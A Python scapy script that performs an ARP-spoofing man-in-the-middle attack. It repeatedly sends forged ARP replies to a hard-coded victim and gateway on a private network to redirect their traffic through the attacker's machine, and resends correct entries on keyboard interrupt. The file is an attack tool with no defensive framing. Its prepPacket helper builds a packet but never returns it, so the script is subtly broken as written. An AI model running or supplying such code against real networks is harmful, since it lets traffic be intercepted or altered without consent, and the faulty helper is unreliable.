from scapy.all import ARP, Ether, conf, getmacbyip, get_if_hwaddr, get_if_addr, send

import time
import random as rd

interface = conf.iface

macAttacker = get_if_hwaddr(interface)
ipAttacker = get_if_addr(interface)

macVictim = "ff:ff:ff:ff:ff:ff"
ipVictim = "192.168.178.144"

macServer = "ff:ff:ff:ff:ff:ff"
ipServer = "192.168.178.1"

def MIMspoofARP(ipVictim, ipServer):
    macVictim = getmacbyip(ipVictim)
    macServer = getmacbyip(ipServer)

    # arpTo = Ether() / ARP()
    # arpTo[Ether].src = macAttacker
    # arpTo[ARP].hwsrc = macAttacker
    # arpTo[ARP].psrc = ipServer
    # arpTo[ARP].hwdst = macVictim
    # arpTo[ARP].pdst = ipVictim

    # arpFrom = Ether() / ARP()
    # arpFrom[Ether].src = macAttacker
    # arpFrom[ARP].hwsrc = macAttacker
    # arpFrom[ARP].psrc = ipVictim
    # arpFrom[ARP].hwdst = macServer
    # arpFrom[ARP].pdst = ipServer
    arp1 = prepPacket(macServer, ipServer, ipVictim)
    arp2 = prepPacket(macVictim, ipVictim, ipServer)

    try:
        while(True):
#             print("Poisoning Arp table")
            send(arp1, verbose=False)
            send(arp2, verbose=False)
            time.sleep(2)
    except KeyboardInterrupt:
        undoARPSpoof(ipVictim, ipServer, macVictim, macServer)


def undoARPSpoof(ipVictim, ipServer, macVictim, macServer):
    undoVictim = ARP(hwsrc=macVictim, psrc=ipVictim, hwdst=macServer, pdst=ipServer)
    undoServer = ARP(hwdst=macVictim, pdst=ipVictim, hwsrc=macServer, psrc=ipServer)

    send(undoVictim, count=4, verbose=False)
    send(undoServer, count=4, verbose=False)

def prepPacket(targetMAC, targetIP, spoofedIP):
    arp1 = ARP(op=2, pdst=targetIP, hwdst=targetMAC, psrc=spoofedIP)


if __name__ == "__main__":
    MIMspoofARP(ipVictim, ipServer)
